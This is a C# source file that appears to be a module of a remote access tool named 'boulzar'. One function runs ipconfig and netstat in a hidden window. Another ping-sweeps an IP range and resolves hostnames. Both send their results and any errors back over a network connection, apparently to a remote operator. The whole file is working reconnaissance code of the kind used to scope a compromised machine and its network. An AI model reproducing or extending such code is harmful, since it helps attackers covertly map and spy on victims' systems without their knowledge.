using boulzar.Other;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
namespace boulzar.Methods
{
    class Networkz
    {
        public static void Info()
        {
            try
            {
                string info = "";
                ProcessStartInfo prcinfo = new ProcessStartInfo();
                prcinfo.CreateNoWindow = true;
                prcinfo.FileName = "cmd.exe";
                prcinfo.Arguments = "/c ipconfig";
                prcinfo.StandardOutputEncoding = Encoding.GetEncoding(850);
                prcinfo.UseShellExecute = false;
                prcinfo.RedirectStandardOutput = true;
                Process cmd = new Process();
                cmd.StartInfo = prcinfo;
                cmd.Start();
                info = cmd.StandardOutput.ReadToEnd() + Environment.NewLine;

                info += "===========================================================================" + Environment.NewLine;
                prcinfo.FileName = "netstat.exe";
                prcinfo.Arguments = "-e";
                cmd.Start();
                info += cmd.StandardOutput.ReadToEnd() + Environment.NewLine;

                info += "===========================================================================" + Environment.NewLine;
                prcinfo.FileName = "netstat.exe";
                prcinfo.Arguments = "-r";
                cmd.Start();
                info += cmd.StandardOutput.ReadToEnd() + Environment.NewLine;
                Helpers.Send(DataType.NetworkInfo, Helpers.Getbytes(info));

            }
            catch (Exception ex)
            {
                Helpers.SendError(ex);
            }
        }

        public static void Scanne(string start, string end)
        {
            try
            {

                string IP_Up = "";
                string[] startIPString = start.Split('.');
                int[] startIP = Array.ConvertAll<string, int>(startIPString, int.Parse); //Change string array to int array
                string[] endIPString = end.Split('.');
                int[] endIP = Array.ConvertAll<string, int>(endIPString, int.Parse);
                int count = 0; //Count the number of successful pings
                Ping myPing;
                PingReply reply;
                IPAddress addr;
                IPHostEntry host;




                //Loops through the IP range, maxing out at 255
                for (int i = startIP[2]; i <= endIP[2]; i++)
                { //3rd octet loop
                    for (int y = startIP[3]; y <= 255; y++)
                    { //4th octet loop
                        string ipAddress = startIP[0] + "." + startIP[1] + "." + i + "." + y; //Convert IP array back into a string
                        string endIPAddress = endIP[0] + "." + endIP[1] + "." + endIP[2] + "." + (endIP[3] + 1); // +1 is so that the scanning stops at the correct range


                        //If current IP matches final IP in range, break
                        if (ipAddress == endIPAddress)
                        {
                            break;
                        }

                        myPing = new Ping();
                        try
                        {
                            reply = myPing.Send(ipAddress, 500); //Ping IP address with 500ms timeout
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("This is from the ping ip addrese" + ex.Message);
                            break;
                        }



                        if (reply.Status == IPStatus.Success)
                        {
                            try
                            {
                                addr = IPAddress.Parse(ipAddress);
                                host = Dns.GetHostEntry(addr);
                                IP_Up += "-" + ipAddress + "-" + "@" + host.HostName + "@" + "#Up#"; //Log successful pings

                                count++;
                            }
                            catch
                            {
                                IP_Up += "-" + ipAddress + "-" + "@" + "Could not retrieve" + "@" + "#Up#";  //Logs pings that are successful, but are most likely not windows machines

                                count++;
                            }

                        }



                        List<byte> Tozend = new List<byte>();
                        Tozend.Add((int)DataType.netscanprog);
                        Tozend.AddRange(Encoding.ASCII.GetBytes(ipAddress));
                        Networking.MainClient.Send(Tozend.ToArray());
                        Tozend.Clear();

                    }

                    startIP[3] = 1; //If 4th octet reaches 255, reset back to 1
                }


                //this when it done
                Helpers.Send(DataType.networkScane, Helpers.Getbytes(IP_Up));

            }
            catch (ThreadAbortException tex)
            {

            }

            catch (Exception ex)
            {
                Helpers.SendError(ex);

            }
        }


    }
}
